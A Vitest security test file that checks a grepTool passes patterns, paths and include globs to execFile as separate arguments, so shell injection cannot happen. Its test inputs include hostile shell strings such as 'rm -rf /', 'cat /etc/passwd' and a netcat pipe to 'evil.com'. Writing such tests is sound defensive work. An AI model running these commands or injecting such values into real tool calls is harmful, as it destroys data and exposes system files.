/**
 * Security tests for command injection prevention (B2).
 *
 * Verifies that grepTool uses execFile (argument arrays) instead of exec (shell strings),
 * preventing injection via malicious patterns, dirPaths, and include globs.
 */

import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest'
import { vol } from 'memfs'
import { grepTool } from '../../src/infra/tools/grepTool.js'
import { MemFsArtifactStore } from '../../src/infra/memFsArtifactStore.js'

const mockExecFile = vi.fn()
vi.mock('node:child_process', () => ({
  execFile: (...args: any[]) => mockExecFile(...args)
}))

describe('command injection prevention (B2)', () => {
  const baseDir = '/test-workspace'
  let store: MemFsArtifactStore

  beforeEach(() => {
    vi.clearAllMocks()
    vol.reset()
    store = new MemFsArtifactStore(baseDir)
    vol.mkdirSync(baseDir, { recursive: true })
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  it('should reject patterns with null bytes', async () => {
    const result = await grepTool.execute(
      { pattern: 'foo\0bar' },
      { baseDir, taskId: 't1', actorId: 'a1', artifactStore: store }
    )
    expect(result.isError).toBe(true)
    expect((result.output as any).error).toContain('null bytes')
  })

  it('should pass shell metacharacters safely as execFile arguments', async () => {
    // Patterns that would be dangerous with shell exec but safe with execFile
    const dangerousPatterns = [
      '; rm -rf /',
      '$(whoami)',
      '`id`',
      'foo && cat /etc/passwd',
      'bar | nc evil.com 1234',
      'baz\nnewline',
    ]

    for (const pattern of dangerousPatterns) {
      mockExecFile.mockClear()
      // Make all execFile calls fail so we reach JS fallback
      mockExecFile.mockImplementation((_f: string, _a: string[], _o: any, cb: any) => {
        cb(new Error('not available'), '', '')
      })

      // Create a dummy file so JS fallback has something to scan
      vol.reset()
      vol.mkdirSync(baseDir, { recursive: true })
      vol.fromJSON({ 'safe.txt': 'nothing here' }, baseDir)

      const result = await grepTool.execute(
        { pattern },
        { baseDir, taskId: 't1', actorId: 'a1', artifactStore: store }
      )

      // Should not crash — either returns results or "no matches"
      expect(result.isError).toBe(false)
    }
  })

  it('should pass pattern as distinct argument to git grep, not concatenated', async () => {
    const maliciousPattern = '; cat /etc/passwd'
    mockExecFile.mockImplementation((file: string, args: string[], _opts: any, cb: any) => {
      if (file === 'git' && args.includes('rev-parse')) {
        cb(null, 'true', '')
      } else if (file === 'git' && args[0] === 'grep') {
        // Verify the pattern is an array element, not in a concatenated string
        expect(args).toContain(maliciousPattern)
        cb(null, '', '') // no matches
      } else {
        cb(new Error('not found'), '', '')
      }
    })

    const result = await grepTool.execute(
      { pattern: maliciousPattern },
      { baseDir, taskId: 't1', actorId: 'a1', artifactStore: store }
    )

    // The call should complete without the shell interpreting the semicolon
    expect(result.isError).toBe(false)
  })

  it('should pass directory path safely to execFile (no shell interpolation)', async () => {
    mockExecFile.mockImplementation((file: string, args: string[], _opts: any, cb: any) => {
      if (file === 'git' && args.includes('rev-parse')) {
        cb(null, 'true', '')
      } else if (file === 'git' && args[0] === 'grep') {
        // dirPath should appear as a distinct element
        expect(args).toContain('$(malicious)')
        cb(null, '', '')
      } else {
        cb(new Error('not found'), '', '')
      }
    })

    const result = await grepTool.execute(
      { pattern: 'test', path: '$(malicious)' },
      { baseDir, taskId: 't1', actorId: 'a1', artifactStore: store }
    )

    expect(result.isError).toBe(false)
  })

  it('should pass include glob safely to execFile', async () => {
    mockExecFile.mockImplementation((file: string, args: string[], _opts: any, cb: any) => {
      if (file === 'git' && args.includes('rev-parse')) {
        cb(null, 'true', '')
      } else if (file === 'git' && args[0] === 'grep') {
        // include should be passed via -- separator, not concatenated
        const dashDashIdx = args.indexOf('--')
        expect(dashDashIdx).toBeGreaterThan(0)
        expect(args[dashDashIdx + 1]).toBe('*.ts;rm -rf /')
        cb(null, '', '')
      } else {
        cb(new Error('not found'), '', '')
      }
    })

    await grepTool.execute(
      { pattern: 'test', include: '*.ts;rm -rf /' },
      { baseDir, taskId: 't1', actorId: 'a1', artifactStore: store }
    )
  })
})
